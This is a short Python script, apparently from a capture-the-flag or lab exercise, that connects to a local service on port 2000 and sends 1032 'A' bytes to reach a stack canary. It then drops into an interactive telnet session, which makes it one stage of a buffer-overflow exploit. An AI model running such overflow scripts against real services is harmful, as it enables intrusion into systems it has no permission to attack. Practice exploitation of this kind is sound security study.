#!/usr/bin/python3

import socket
import telnetlib

# constants
bytes_to_canary = 1032

# start connection
s = socket.create_connection(('localhost', 2000))

print(s.recv(2048).decode('ASCII'))

# send number of bytes to be examined
s.send(str(bytes_to_canary+1).encode() +  b"\n")
print(s.recv(2048).decode('ASCII'))

# send byte values
s.send(b"A"*(bytes_to_canary) + b"\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()

